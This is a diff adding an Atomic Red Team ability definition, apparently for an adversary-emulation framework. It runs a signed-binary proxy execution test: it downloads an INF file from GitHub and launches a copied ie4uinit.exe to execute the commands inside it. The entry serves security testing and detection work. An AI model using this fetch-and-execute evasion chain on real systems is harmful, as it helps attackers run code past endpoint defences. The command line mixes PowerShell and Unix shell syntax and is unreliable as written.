@@ -1,0 +1,58 @@
+- id: 13c0804e-615e-43ad-b223-2dfbacd0b0b3
+  name: Lolbas ie4uinit.exe use as proxy
+  description: 'Executes commands from a specially prepared ie4uinit.inf file.
+
+    Poc from : https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/
+
+    Reference: https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/'
+  tactic: defense-evasion
+  technique:
+    attack_id: T1218
+    name: Signed Binary Proxy Execution
+  platforms:
+    windows:
+      sh:
+        command: 'if (Test-Path "PathToAtomicsFolder\T1218\src\ieuinit.inf") {exit
+          0} else {exit 1}; then : ; else New-Item -Type Directory (split-path "PathToAtomicsFolder\T1218\src\ieuinit.inf")
+          -ErrorAction ignore | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/ieuinit.inf"
+          -OutFile "PathToAtomicsFolder\T1218\src\ieuinit.inf"; fi; copy c:\windows\system32\ie4uinit.exe
+          %TEMP%\ie4uinit.exe; copy "PathToAtomicsFolder\T1218\src\ieuinit.inf" %TEMP%\ieuinit.inf;
+          %TEMP%\ie4uinit.exe -BaseSettings'
+        cleanup: del %TEMP%\ie4uinit.exe >nul 2>&1; del %TEMP%\ieuinit.inf >nul 2>&1
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1218
+  - atomic-red-team
+  - defense-evasion
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      Path_inf:
+        description: Path to the cab file
+        type: path
+        default: PathToAtomicsFolder\T1218\src\ieuinit.inf
+      Path_ie4uinit:
+        description: Path to ie4uinit.exe
+        type: path
+        default: c:\windows\system32\ie4uinit.exe
+    dependencies:
+    - description: 'ieuinit.inf must exist on disk at specified location (#{Path_inf})
+
+        '
+      prereq_command: 'if (Test-Path "#{Path_inf}") {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory (split-path "#{Path_inf}") -ErrorAction
+        ignore | Out-Null
+
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/ieuinit.inf"
+        -OutFile "#{Path_inf}"
+
+        '
+    technique_created: '2018-04-18T17:59:24.739Z'
+    atomic_guid: 13c0804e-615e-43ad-b223-2dfbacd0b0b3
+    import_timestamp: '2025-06-24T11:15:00.293962Z'
